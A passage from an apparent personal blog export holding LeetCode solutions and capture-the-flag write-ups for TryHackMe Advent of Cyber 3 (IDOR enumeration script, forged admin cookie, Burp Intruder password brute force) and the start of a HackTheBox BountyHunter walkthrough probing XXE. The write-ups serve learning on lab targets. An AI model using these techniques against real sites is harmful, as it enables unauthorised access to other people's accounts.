nothing much. Let\u0026rsquo;s just split it out and reverse it.\nC++ accepted solution:\nclass Solution { public: string reverseWords(string s) { int lastChar = 0; string answer = s + \u0026#34; \u0026#34;; for (int wordcount = 0; wordcount \u0026lt; answer.size(); ++wordcount) { if (answer[wordcount] == \u0026#39; \u0026#39;) { int left = lastChar, right = wordcount; lastChar = wordcount + 1; reverse(answer.begin() + left, answer.begin() + right); } } answer.pop_back(); return answer; } }; Accepted Python solution:\nclass Solution: def reverseWords(self, s: str) -\u0026gt; str: return \u0026#34; \u0026#34;.join([word[::-1] for word in s.split()]) Day 5: 876. Middle of the Linked List Solution: Get 2 pointers to iterate at different speed, the faster one is twice as fast as the slower one. When the faster pointer reach the end, the slower pointer should be in the middle.\nAccepted C++ implementation:\n/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public: ListNode* middleNode(ListNode* head) { ListNode *slow = head, *fast = head; while (fast != NULL \u0026amp;\u0026amp; fast -\u0026gt; next != NULL) { slow = slow -\u0026gt; next; fast = fast -\u0026gt; next -\u0026gt; next; } return slow; } }; For Python, I tried to store all nodes in a list and then pick the middle out. Unexptectedly, 2 algorithms run at exactly same speed (28ms) and memory (14.1 MB):\n# Should be slower, but wasn\u0026#39;t. # Definition for singly-linked list. # class ListNode: # def __init__(self, val=0, next=None): # self.val = val # self.next = next class Solution: def middleNode(self, head: Optional[ListNode]) -\u0026gt; Optional[ListNode]: allList: List[ListNode] = [] currentNode = head while True: allList.append(currentNode) if not currentNode.next: break currentNode = currentNode.next return allList[len(allList) // 2] class Solution: def middleNode(self, head: Optional[ListNode]) -\u0026gt; Optional[ListNode]: slow: ListNode = head fast: ListNode = head while fast != None and fast.next != None: slow = slow.next fast = fast.next.next return slow Day 5: 19. Remove Nth Node From End of List Again, the solution is to have 2 pointers run with the distance n. When get to the node need to be deleted, simply link the previous node to the next node.\nC++ implementation (faster than 100% and run at 0ms. lmao proud :D):\n/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public: ListNode* removeNthFromEnd(ListNode* head, int n) { if (n == 0) return head; ListNode *fast = head, *slow = head; int fastIndex = 0, slowIndex = 0; while (fast -\u0026gt; next != NULL) { fast = fast -\u0026gt; next; ++fastIndex; if (fastIndex - slowIndex \u0026gt; n) { slow = slow -\u0026gt; next; ++slowIndex; } } // For edge case  int linkedListSize = fastIndex + 1; if (linkedListSize == n) return head -\u0026gt; next; // Deleting by wiring previous to after deleting element  slow -\u0026gt; next = slow -\u0026gt; next -\u0026gt; next; return head; } }; Python implementation:\n# Definition for singly-linked list. # class ListNode: # def __init__(self, val=0, next=None): # self.val = val # self.next = next class Solution: def removeNthFromEnd(self, head: Optional[ListNode], n: int) -\u0026gt; Optional[ListNode]: if n == 0: return head fast: ListNode = head slow: ListNode = head fastIndex = slowIndex = 0 while fast.next != None: fast = fast.next fastIndex += 1 if fastIndex - slowIndex \u0026gt; n: slow = slow.next slowIndex += 1 linkedListSize: int = fastIndex + 1 if n == linkedListSize: return head.next # Deleting slow.next = slow.next.next return head Day 6: 3. Longest Substring Without Repeating Character The general idea is: Store the last position that does not contain a certain character, for every character in the string. When meet the next occurence of that character, we can immediately know length of the longest substring up to that point.\nC++ implementation:\nclass Solution { public: int lengthOfLongestSubstring(string s) { int maxcount = 0; unordered_map\u0026lt;char, int\u0026gt; index; for (int left = 0, right = 0; right \u0026lt; s.size(); ++right) { if (index.find(s[right]) != index.end()) { left = max(left, index[s[right]]); } maxcount = max(maxcount, right - left + 1); index[s[right]] = right + 1; } return maxcount; } }; Python implementation:\nclass Solution: def lengthOfLongestSubstring(self, s: str) -\u0026gt; int: maxcount: int = 0 indexes: dict = {} i = 0 for j in range(len(s)): if s[j] in indexes: i = max(i, indexes[s[j]]) maxcount = max(maxcount, j - i + 1) indexes[s[j]] = j + 1 return maxcount Day 6: 567. Permutation in String Just count. Since a permutation can never be longer than s1, let\u0026rsquo;s just iterate through s2 with a sliding window of length s1 and check if it\u0026rsquo;s a permutation by counting number of occurence of every characters.\nC++ implementation:\nclass Solution { public: bool checkInclusion(string s1, string s2) { if (s1.size() \u0026gt; s2.size()) return false; array\u0026lt;int, 26\u0026gt; s1map = {}; // all elements will be init to 0  for (auto c : s1) ++s1map.at((int)(c - \u0026#39;a\u0026#39;)); for (int start = 0; start \u0026lt; s2.size() - s1.size() + 1; ++start) { array\u0026lt;int, 26\u0026gt; s2map = {}; for (int i = start; i \u0026lt; start + s1.size(); ++i) ++s2map.at((int)(s2[i] - \u0026#39;a\u0026#39;)); if (s1map == s2map) return true; } return false; } }; Python implementation:\nclass Solution: def checkInclusion(self, s1: str, s2: str) -\u0026gt; bool: if len(s1) \u0026gt; len(s2): return False s1map = [0] * 26 for char in s1: s1map[ord(char) - ord(\u0026#39;a\u0026#39;)] += 1 # Sliding window for start in range(len(s2) - len(s1) + 1): s2map = [0] * 26 for char in range(start, start + len(s1)): s2map[ord(s2[char]) - ord(\u0026#39;a\u0026#39;)] += 1 if s1map == s2map: return True return False Daily coding problems December 2nd: 328. Odd Even Linked List Accepted Python solution:\n# Definition for singly-linked list. # class ListNode: # def __init__(self, val=0, next=None): # self.val = val # self.next = next class Solution: def move2Nodes(self, node: ListNode) -\u0026gt; ListNode: node.next = node.next.next return node.next def oddEvenList(self, head: Optional[ListNode]) -\u0026gt; Optional[ListNode]: if head == None: return head oddNode: ListNode = head evenNode: ListNode = head.next firstEvenElement: ListNode = evenNode while evenNode != None and evenNode.next != None: oddNode = self.move2Nodes(oddNode) evenNode = self.move2Nodes(evenNode) oddNode.next = firstEvenElement return head Accepted C++ solution:\n/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public: void movePointer2Nodes(ListNode*\u0026amp; pointer) { pointer -\u0026gt; next = pointer -\u0026gt; next -\u0026gt; next; pointer = pointer -\u0026gt; next; } ListNode* oddEvenList(ListNode* head) { if (head == NULL) { return head; } ListNode *oddPointer = head, *evenPointer = head -\u0026gt; next; ListNode *firstEvenElement = evenPointer; // Intuition: Use 2 pointers,  // iterate them by 2 nodes in turn,  // then link the last element of odd to  // the first element of even  while (evenPointer != NULL \u0026amp;\u0026amp; evenPointer -\u0026gt; next != NULL) { movePointer2Nodes(oddPointer); movePointer2Nodes(evenPointer); } oddPointer -\u0026gt; next = firstEvenElement; return head; } }; However, this one got Runtime Error:\n/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public: void movePointer2Nodes(ListNode*\u0026amp; pointer) { pointer -\u0026gt; next = pointer -\u0026gt; next -\u0026gt; next; pointer = pointer -\u0026gt; next; } ListNode* oddEvenList(ListNode* head) { ListNode *oddPointer = head, *evenPointer = head -\u0026gt; next; ListNode *firstEvenElement = evenPointer; // Intuition: Use 2 pointers,  // iterate them by 2 nodes in turn,  // then link the last element of odd to  // the first element of even  while (evenPointer != NULL \u0026amp;\u0026amp; evenPointer -\u0026gt; next != NULL) { movePointer2Nodes(oddPointer); movePointer2Nodes(evenPointer); } oddPointer -\u0026gt; next = firstEvenElement; return head; } }; without comparing it with the above accepted code, can you figure out where\u0026rsquo;s the flaw? :D\nDecember 7th: 1290. Convert Binary Number in a Linked List to Interger Nothing much to discuss here. Let\u0026rsquo;s do some elementary math.\nAt first I thought bitwise operators must be faster than doing normal operations, so I tried this:\n/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public: int getDecimalValue(ListNode* head) { int decimal = 0; ListNode* node = head; while (node != NULL) { decimal = (decimal \u0026lt;\u0026lt; 1) | node -\u0026gt; val; node = node -\u0026gt; next; } return decimal; } }; And it ran at 7ms. Not that bad. However, when I change this line:\ndecimal = (decimal \u0026lt;\u0026lt; 1) | node -\u0026gt; val; Which are bitwise operators, to normal operators:\ndecimal = decimal * 2 + node -\u0026gt; val; It ran at 4ms - slightly faster. Why?\nBy the way, here\u0026rsquo;s the Python implementation (faster than 97.4%, and please don\u0026rsquo;t care about space complexity lol):\n# Definition for singly-linked list. # class ListNode: # def __init__(self, val=0, next=None): # self.val = val # self.next = next class Solution: def getDecimalValue(self, head: ListNode) -\u0026gt; int: digits: List[str] = [] node = head while node != None: digits.append(str(node.val)) node = node.next return int(\u0026#34;\u0026#34;.join(digits), 2) December 8th: 563. Binary Tree Tilt Just basic recursive function. To find the tilt of a node, we first need to find its children sum. The same is also true for higher nodes, hence this C++ implementation:\n/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */ class Solution { public: int nodeSum(TreeNode* node, int\u0026amp; total) { if (node == NULL) return 0; int leftSum = nodeSum(node -\u0026gt; left, total); int rightSum = nodeSum(node -\u0026gt; right, total); total += abs(leftSum - rightSum); return leftSum + rightSum + node -\u0026gt; val; } int findTilt(TreeNode* root) { int answer = 0; nodeSum(root, answer); return answer; } }; Faster than 95.64% by the way :D. And here\u0026rsquo;s Python version of that exact algorithm:\n# Definition for a binary tree node. # class TreeNode: # def __init__(self, val=0, left=None, right=None): # self.val = val # self.left = left # self.right = right class Solution: def findTilt(self, root: Optional[TreeNode]) -\u0026gt; int: answer: int = 0 def nodeSum(node: TreeNode): nonlocal answer if node == None: return 0 leftSum: int = nodeSum(node.left) rightSum: int = nodeSum(node.right) tilt = abs(leftSum - rightSum) answer += tilt return node.val + leftSum + rightSum nodeSum(root) return answer December 9th: 1306. Jump Game III What came to your mind first? Recursive check function, right?\nI\u0026rsquo;ve to admit, it\u0026rsquo;s quite slow and memory-ineffective. But hey, it\u0026rsquo;s simple to understand, and relatively short to implement. :D\nclass Solution { public: bool canReach(vector\u0026lt;int\u0026gt;\u0026amp; arr, int start) { if (start \u0026lt; 0 || start \u0026gt; arr.size() || arr[start] \u0026lt; 0) return false; if (arr[start] == 0) return true; arr[start] *= -1; // mark iterated indexes  return canReach(arr, start + arr[start]) || canReach(arr, start - arr[start]); } }; Here\u0026rsquo;s Python-translated version:\nclass Solution: def canReach(self, arr: List[int], start: int) -\u0026gt; bool: # Depth first search if start \u0026lt; 0 or start \u0026gt;= len(arr) or arr[start] \u0026lt; 0: return False if arr[start] == 0: return True arr[start] *= -1 return self.canReach(arr, start + arr[start]) or self.canReach(arr, start - arr[start]) December 13th: 1446. Consecutive Characters Nothing much here - just count it! :v\nHere\u0026rsquo;s 93.39% faster than others Python implementation:\nclass Solution: def maxPower(self, s: str) -\u0026gt; int: if len(s) \u0026lt;= 1: return len(s) maxPower = 0 power = 0 currentChar: chr = s[0] for char in s: if char == currentChar: power += 1 maxPower = max(power, maxPower) else: currentChar = char power = 1 return maxPower And 100% faster, 0ms execution time C++ implementation:\nclass Solution { public: int maxPower(string s) { if (s.size() == 1) return s.size(); char currentChar = s[0]; int power = 0, maxPower = 0; for (char c:s) { if (c == currentChar) maxPower = max(maxPower, ++power); else { currentChar = c; power = 1; } } return maxPower; } }; December 14th: 938. Range Sum of BST Another nothing-much-to-say problem. Let\u0026rsquo;s just traverse the tree and do exactly as the problem required.\nHere\u0026rsquo;s the Python implementation:\nclass Solution: def rangeSumBST(self, root: Optional[TreeNode], low: int, high: int) -\u0026gt; int: if root == None: return 0 if low \u0026lt;= root.val and root.val \u0026lt;= high: return root.val + self.rangeSumBST(root.left, low, high) + self.rangeSumBST(root.right, low, high) return self.rangeSumBST(root.left, low, high) + self.rangeSumBST(root.right, low, high) And the C++ implementation:\nclass Solution { public: int rangeSumBST(TreeNode* root, int low, int high) { if (root == NULL) return 0; if (low \u0026lt;= root -\u0026gt; val \u0026amp;\u0026amp; root -\u0026gt; val \u0026lt;= high) return root -\u0026gt; val + rangeSumBST(root -\u0026gt; left, low, high) + rangeSumBST(root -\u0026gt; right, low, high); return rangeSumBST(root -\u0026gt; left, low, high) + rangeSumBST(root -\u0026gt; right, low, high); } }; Try to guess the performance of them both? :D\nTo my surprise, here\u0026rsquo;s a comparison of that exact algorithm in 2 languages: See the difference? C++ ran twice as fast, with 3 times as much memory usage. An unexpected trade-off. Guess the Python\u0026rsquo;s garbage collector\u0026rsquo;s shown off its mightiness after all. :D\n","permalink":"https://git-akihakune.github.io/blog/myleetcodejourney/","summary":"My Leetcode journey from scratch","title":"My Leetcode journey"},{"content":"Before reading this article, I strongly suggest you take your time and try the challenges out yourself, it will definitely worth your time!\nSince Try Hack Me has done an awesome job in explaining things plain and simple, I won\u0026rsquo;t repeat again their tutorial. Instead, I\u0026rsquo;ll try to summarize it in the most concise (but understandable) way I can.\n[Day 1] Web Exploitation: Save The Gifts So, today\u0026rsquo;s learning objective seems to be IDOR vulnerability, which stands for Insecure Direct Object Reference.\nTo keep it short, IDOR vulnerabilities occur when a developer doesn\u0026rsquo;t validate requesting data, For example:\nSee that id=23 at the end? That is your user ID. If you change that to id=0, id=-1,id=null or something, and you suddenly get in another user\u0026rsquo;s account, that is IDOR vulnerability.\nBeside the GET request example above, we also have IDOR in POST request:\n\u0026lt;form method=\u0026#34;POST\u0026#34; action=\u0026#34;/update-password\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;user_id\u0026#34; value=\u0026#34;123\u0026#34;\u0026gt; \u0026lt;div\u0026gt;New Password:\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;new_password\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Change Password\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026hellip; or in cookies:\nGET /user-information HTTP/1.1 Host: website.thm Cookie: user_id=9 User-Agent: Mozilla/5.0 (Ubuntu;Linux) Firefox/94.0 Hello Jon! And in reality, if you check public Hackerone bug submissions, you will find a great portion of IDOR vulnerabilities there.\nNow with all that knowledge, let\u0026rsquo;s dive into our challenge.\nUpon entering that website, we\u0026rsquo;re welcomed with a homepage like this.\nClick on anything clickable, we found out that nothing is clickable on those pages. That left us with only the page Your Activity.\nWithout any obstacle, we can instantly find a textbook vulnerability. It lies here:\nRemember, in programming languages, it usually start from 0 rather than 1. But if we try ?user_id=0, it will scream \u0026ldquo;lol no user like that bro\u0026rdquo;.\nBut if we change that to ?user_id=1:\nGuess we\u0026rsquo;re in. :D\nIn the wild, the number of possibilities to test is simply too massive to manually try it all. So the best way is to use on-the-spot scripts like this:\n#!/usr/bin/env python3 import requests address: str = \u0026#34;https://inventory-management.thm/activity\u0026#34; startId: int = 0 testRange: int = 20 for id in range(startId, startId + testRange): response = requests.get(address, params={\u0026#34;user_id\u0026#34;: id}) if response.status_code == 200: print(f\u0026#34;Found something at {address}?user_id={id}\u0026#34;) Just iteratively try that id out, we also find McStocker\u0026rsquo;s account at https://inventory-management.thm/activity?user_id=3.\nAnd another at ?user_id=9:\nAnd when we click on all those revert (as our instinct tell us to do so), we got the final flag.\nTo conclude, our flags today are:\nAfter finding Santa's account, what is their position in the company? The Boss!\nAfter finding McStocker's account, what is their position in the company? Build Manager\nAfter finding the account responsible for tampering, what is their position in the company? Mischief Manager\nWhat is the received flag when McSkidy fixes the Inventory Management System? THM{AOC_IDOR_2B34BHI3}\n[Day 2] Web Exploitation: Elf HR Problems So in short, today\u0026rsquo;s learning objective is fundamental knowledge about the WWW. You can skip all the text below and jump right to answers if you\u0026rsquo;ve already had experience working with the web.\nSince this is actually a vast topic, I\u0026rsquo;ll try keeping things simple by omitting the details. If you want to learn more in-depth about web technologies (which you should, because it\u0026rsquo;s like Hello World for pentesters and developers alike), I suggest the great Mozilla Docs, where they\u0026rsquo;ve explained everything with great details.\nFirst things first, HTTP.\nYou are reading this article, on the Internet, from your browser, aren\u0026rsquo;t you?\nThen I hope you\u0026rsquo;re using a computer. Press Ctr+U, or right click and View Page Source, you should see something like this: As you can see, this is the true nature of the Web - Hypertext. A bunch of codes define what a page contain, how does it look, what will it do, and so on.\nWhen people talk about HTTP, they\u0026rsquo;re talking about the way in which such Hypertext are transferred among computers - sending request, and waiting to be responded (imagine you messaging with someone). An example request:\nGET / HTTP/1.1 Host: tryhackme.com User-Agent: Mozilla/5.0 Firefox/87.0 Referer: https://tryhackme.com/ And an example respond:\nHTTP/1.1 200 OK Server: nginx/1.15.8 Date: Wednesday, 24 Nov 2021 13:34:03 GMT Content-Type: text/html Content-Length: 98 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Advent of Cyber\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Welcome To Advent of Cyber! \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; As you can see, Hypertext is also in the respond. The browser render that, then showing you the page - all happened in the matter of miliseconds.\nHTTPS is HTTP, but more secure, since it\u0026rsquo;s encrypted.\nOn the other hand, cookie is a something sent back and forth among computers, to identify who you are.\nOn your browser, press F12 to open Dev Tools, find Cookies tab, somewhere in Storage or Application. The yummy cookies should be there. And since cookies are stored locally on your computer, it can be changed however we want.\nEquipped with all that knowledge, here comes the challenge!\nGet into the challenge page, we see an ordinary login form.\nLet\u0026rsquo;s register an account!\n\u0026hellip; okay? ('-')\nChecking DevTool, we can find a cookie like this\nuser-auth:\u0026#34;7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a22746573746572227d\u0026#34; It\u0026rsquo;s not very readable. So let\u0026rsquo;s try to decode it with CyberChef.\n(If you find the image too small to read, why don\u0026rsquo;t open up another tab and decode it? :D)\nWe can see that the cookie is stored in JSON format, encoded in hexadecimal.\nChanging out username to admin (as the task told us to), then copy-pasting it to DevTool\u0026hellip;\nThis is certified \u0026ldquo;I\u0026rsquo;m in\u0026rdquo; moment. :D\nFrom there, we can get all needed information to answer the questions:\nWhat is the name of the new cookie that was created for your account?\nuser-auth\nWhat encoding type was used for the cookie value?\nhexadecimal\nWhat object format is the data of the cookie stored in?\njson\nWhat is the value of the administrator cookie? (username = admin)\n7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d What team environment is not responding?\nHR\nWhat team environment has a network warning?\nApplication\n[Day 3] Web Exploitation: Christmas Blackout Okay, long story short, content discovery and authentication bypass. Absolutely useful in real life applications.\nThere\u0026rsquo;s not much to say about this, since everything we\u0026rsquo;re gonna do is bruteforcing the credentials. One reminder, thou, is that in real life bruteforcing is nowhere near as effective as it\u0026rsquo;s in ctfs, and let\u0026rsquo;s be grateful for that. :D\nAnd just like that, we\u0026rsquo;ve got the location of admin panel.\nFrom here, we usually use specialised tools like Hydra. However we\u0026rsquo;ve already been given a wordlist with only 3 entries in this case, which\u0026rsquo;s saved us from the hassle of writing lengthy commands. :D\nManually test the entries, we got it at administrator:administrator.\nAnother way to do that is taking a look at the JS file.\nconst loginForm = document.getElementById(\u0026#34;login-form\u0026#34;); const loginButton = document.getElementById(\u0026#34;login-form-submit\u0026#34;); const loginErrorMsg = document.getElementById(\u0026#34;login-error-msg\u0026#34;); loginButton.addEventListener(\u0026#34;click\u0026#34;, (e) =\u0026gt; { e.preventDefault(); const username = loginForm.username.value; const password = loginForm.password.value; if (username === \u0026#34;administrator\u0026#34; \u0026amp;\u0026amp; password === \u0026#34;administrator\u0026#34;) { alert(\u0026#34;You have successfully logged in.\u0026#34;); window.open(\u0026#39;dc7161be3dbf2250c8954e5.html\u0026#39;); } else { loginErrorMsg.style.opacity = 1; } }) We can clearly see username and password written in plaintext, and even the \u0026ldquo;secret\u0026rdquo; location it\u0026rsquo;ll redirect us to. Again, in real life, no sane developer do this. However, let\u0026rsquo;s just be chill in this ctf-only \u0026ldquo;I\u0026rsquo;m in\u0026rdquo; moment and move on! xD\nHaving accessed to the admin panel, now we\u0026rsquo;ve got all flags needed for the questions!\nUsing a common wordlist for discovering content, enumerate http://10.10.235.89 to find the location of the administrator dashboard. What is the name of the folder? admin\nIn your web browser, try some default credentials on the newly discovered login form for the \u0026quot;administrator\u0026quot; user. What is the password? administrator\nAccess the admin panel. What is the value of the flag? THM{ADM1N_AC3SS}\n[Day 4] Web Exploitation: Santa\u0026rsquo;s running behind Today\u0026rsquo;s learning material is relatively short and concise. So in case you haven\u0026rsquo;t, please go to Day 4 tutorial here.\nOne small reminder, thou: Burpsuite is (in)famous for its avaricious RAM usage, so if you run it in a virtual machine, watch out for sudden halts.\nAnother thing: Burp Suite\u0026rsquo;s built in browser\u0026rsquo;s become fantastic nowadays - a separate Firefox with FoxyProxy is no longer needed.\nOne final extra note: If you, for some reason, don\u0026rsquo;t want or can\u0026rsquo;t afford the Burp Suite pro version, or just genuinely support the idea of open-source softwares, then try to take a look at ZAP. On my own, I find Burp Suite\u0026rsquo;s UI more intuitive, but ZAP\u0026rsquo;s much more powerful once you get the hang of it.\nWith all that being said, let\u0026rsquo;s jump in. :D\nWe\u0026rsquo;re greeted with a basic login form like this. Neither the source code or default credentials revealed anything special.\nBased on task\u0026rsquo;s requirements, seems like all we\u0026rsquo;ve to do\u0026rsquo;s to bruteforce it. Let me show you the cool way to do it. :D\n\u0026hellip; or not\u0026hellip; Weird. :L\nLet\u0026rsquo;s burn our RAM and open up Burp Suite, then.\nHere\u0026rsquo;s the POST request we intercepted:\nPOST / HTTP/1.1 Host: 10.10.154.103 Content-Length: 45 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://10.10.154.103 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://10.10.154.103/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=c3k9aqaa365sapdv67vh3p3bte Connection: close username=santa\u0026amp;password=password\u0026amp;submit=Login Let\u0026rsquo;s Ctrl+I to send it to Intruder.\nThe first Target tab, default options are fine. On the second Positions tab, make sure that you only insert payloads in password field:\nPOST / HTTP/1.1 Host: 10.10.154.103 Content-Length: 45 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://10.10.154.103 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://10.10.154.103/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=c3k9aqaa365sapdv67vh3p3bte Connection: close username=santa\u0026amp;password=Â§passwordÂ§\u0026amp;submit=Login Now continues to Payload tab. Since we\u0026rsquo;ve already had a nice small password list, let\u0026rsquo;s copy it and Paste.\nIt all looks good now. Let\u0026rsquo;s press Start Attack on upper right side. Here\u0026rsquo;s the result:\nBased on the length, we can easily spot the unique one.\nHaving had all that information, let\u0026rsquo;s login to santa\u0026rsquo;s account!\nAnd here comes the last flag!\nSo our flags today are:\nWhat valid password can you use to access the \u0026quot;santa\u0026quot; account? cookie\nWhat is the flag in Santa's itinerary? THM{SANTA_DELIVERS}\n","permalink":"https://git-akihakune.github.io/blog/adventofcyber3/","summary":"Writeup for 2021 Try Hack Me\u0026rsquo;s Advent of Cyber 3","title":"Try Hack Me - Advent Of Cyber 3 writeup"},{"content":"I. Enumeration  First things first, let\u0026rsquo;s start with a port scan!  âââ(akiã¿kali)-[~/ctf/htb/BountyHunter] ââ$ nmap -sC -sV -oN nmap.txt 10.10.11.100 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-06 23:35 EDT Nmap scan report for 10.10.11.100 Host is up (0.68s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 108.32 seconds nothing particularly useful. We got 2 basic ports opening and their versions.\n Checking the service versions, seems like they\u0026rsquo;re relatively new (at the time of writing) and there\u0026rsquo;s no publicly available vulnerability or exploit for them. Manually open it in a web browser, there\u0026rsquo;s also nothing much there, except this \u0026ldquo;portal\u0026rdquo; page   Follow the link, we get to a simple page for submitting exploits:   Checking the source code a bit, we find out that this form create a POST request to \u0026ldquo;tracker_diRbPr00f314.php\u0026rdquo;  function returnSecret(data) { return Promise.resolve($.ajax({ type: \u0026#34;POST\u0026#34;, data: {\u0026#34;data\u0026#34;:data}, url: \u0026#34;tracker_diRbPr00f314.php\u0026#34; })); } async function bountySubmit() { try { var xml = `\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;bugreport\u0026gt; \u0026lt;title\u0026gt;${$(\u0026#39;#exploitTitle\u0026#39;).val()}\u0026lt;/title\u0026gt; \u0026lt;cwe\u0026gt;${$(\u0026#39;#cwe\u0026#39;).val()}\u0026lt;/cwe\u0026gt; \u0026lt;cvss\u0026gt;${$(\u0026#39;#cvss\u0026#39;).val()}\u0026lt;/cvss\u0026gt; \u0026lt;reward\u0026gt;${$(\u0026#39;#reward\u0026#39;).val()}\u0026lt;/reward\u0026gt; \u0026lt;/bugreport\u0026gt;` let data = await returnSecret(btoa(xml)); $(\u0026#34;#return\u0026#34;).html(data) } catch(error) { console.log(\u0026#39;Error:\u0026#39;, error); } }  Upon triggering bountySubmit function, it\u0026rsquo;ll create an xml form and submit it. Sounds like a great XXE to me. Fire up Burp Suite and looking at POST requests, as expected, I saw an encoded string in the data variable of every POST request \u0026ldquo;It must contain the XML\u0026rdquo;, I thought. So I tried to decode it   According to the JS code, the data should be encoded in plain, old Base64, but somehow certain parts of the data seems to be miserably screwed up I messed around in Cyberchef a bit, but that screwed part didn\u0026rsquo;t seems to be meaningful anyway, so I gave up this vector and look for the XXE The idea of decoding it, replace with my payload and send it programmatically flashed into my mind, but at the end I chose a lazy way instead - triggering that returnSecret() function manually in browser DevTool After a few time of trial and error, our target finally seems to be vulnerable to XXE   Next thing is just trial and error, and by that, I mean A LOT OF trials and errors. Come up with a payload, type it in Chrome\u0026rsquo;s dev tool, check for responses in Burp Suite history (the dev tool console looks quite small to get any serious task done), see if it worked (and 9 out of 10 times, if didn\u0026rsquo;t), and repeat I tried all the payloads on OWASP referencing page, and long story short, seems like it\u0026rsquo;s not easy to get a RCE from this XXE Noticing that this site\u0026rsquo;s using PHP, I changed my payload a bit, but still\u0026hellip; nothing appeared. Blind XXE, and blind inject anything in general, is a pain ;-; That\u0026rsquo;s when I thought of encode it in base64 (the same as the sending payload) rather than trying to get it by plaintext   And hey! Looks like I had got the content of that log_submit.php file Using that exact payload, I tried to get files from other directories but\u0026hellip; seems like it\u0026rsquo;s not that easy So I mindlessly browsing around in disorientation. The URI of JS files has the same format \u0026ldquo;resources/some_file.js\u0026rdquo;, so I decided to test it against directory listing It worked perfectly, and from that directory, I had got a precious README.txt file  Tasks: [ ] Disable \u0026#39;test\u0026#39; account on portal and switch to hashed password. Disable nopass. [X] Write tracker submit script [ ] Connect tracker submit script to the database [X] Fix developer group permissions  Come to think of it, this website\u0026rsquo;s root directory (located at/var/www/html I guess? Since it\u0026rsquo;s an Apache sever after all) must have something that I\u0026rsquo;d missed So I ran Gobuster and patiently waited for a good hour  âââ(akiã¿kali)-[~/ctf/htb/BountyHunter] ââ$ gobuster dir --follow-redirect -e -u http://10.10.11.100 -o gobuster.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.100 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Follow Redirect: true [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/09/28 21:51:31 Starting gobuster in directory enumeration mode =============================================================== 